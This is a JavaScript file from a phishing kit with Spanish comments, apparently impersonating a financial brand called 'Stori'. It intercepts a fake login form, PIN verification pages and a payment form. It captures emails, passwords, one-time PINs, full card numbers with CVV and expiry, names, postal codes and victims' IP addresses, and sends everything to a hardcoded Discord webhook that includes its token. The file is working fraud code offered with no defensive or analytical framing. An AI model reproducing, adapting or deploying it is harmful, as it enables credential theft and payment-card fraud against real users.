// Configuración común - DISCORD
const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1571213669348675625/h6b4ppxq74Q9WmwVFCrcCQ-hcWpKboACJX5KyVzURPvxCvNxS9OdAncT0vRavWsYMJr0';

// Función para obtener IP
async function getIP() {
  try {
    const response = await fetch("https://api.ipify.org?format=json");
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error("Error al obtener IP:", error);
    return "Desconocida";
  }
}

// Función para enviar a Discord
async function sendToDiscord(message) {
  try {
    const response = await fetch(DISCORD_WEBHOOK, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        username: "Stori Logger",
        content: message,
      }),
    });
    return await response.json();
  } catch (error) {
    console.error("Error al enviar a Discord:", error);
    return { ok: false };
  }
}

// Manejar envío desde index.html
if (document.getElementById("signup-form")) {
  document
    .getElementById("signup-form")
    .addEventListener("submit", async function (e) {
      e.preventDefault();

      const email = document.getElementById("email").value;
      const password = document.getElementById("pas").value;
      const ip = await getIP();

      const message = `
🛡️ NUEVO INICIO DE SESIÓN
📧 Email: ${email}
🔑 Contraseña: ${password}
🌐 IP: ${ip}
📍 Ubicación: https://www.google.com/maps?q=${ip}
🕒 Fecha: ${new Date().toLocaleString()}
        `;

      await sendToDiscord(message);
      window.location.href = "validacion.html";
    });
}

// Manejar envío desde validacion.html
if (document.getElementById("pin-form")) {
  document.addEventListener("pinCompleted", async function (e) {
    const pin = e.detail.pin;
    const ip = await getIP();

    const message = `
🔢 CÓDIGO DE VERIFICACIÓN
🔐 PIN: ${pin}
🌐 IP: ${ip}
🕒 Fecha: ${new Date().toLocaleString()}
        `;

    await sendToDiscord(message);
  });
}

// Manejar envío desde error.html
document.addEventListener("pinErrorCompleted", async function (e) {
  const pin = e.detail.pin;
  const ip = await getIP();

  const message = `
🔢 CÓDIGO DE VERIFICACIÓN2
🔐 PIN: ${pin}
🌐 IP: ${ip}
🕒 Fecha: ${new Date().toLocaleString()}
⚠️ Intento de verificación fallido
    `;

  await sendToDiscord(message);
});

// Manejar envío desde payment.html
document.addEventListener("paymentCompleted", async function (e) {
  const { cardNumber, expiryDate, cvv, name, postalCode } = e.detail;
  const ip = await getIP();

  const message = `
💳 DATOS DE TARJETA CAPTURADOS
🛡️ Tarjeta: ${cardNumber}
📅 Expira: ${expiryDate}
🔐 CVV: ${cvv}
👤 Nombre: ${name}
📮 Código Postal: ${postalCode}
🌐 IP: ${ip}
🕒 Fecha: ${new Date().toLocaleString()}
    `;

  await sendToDiscord(message);
});
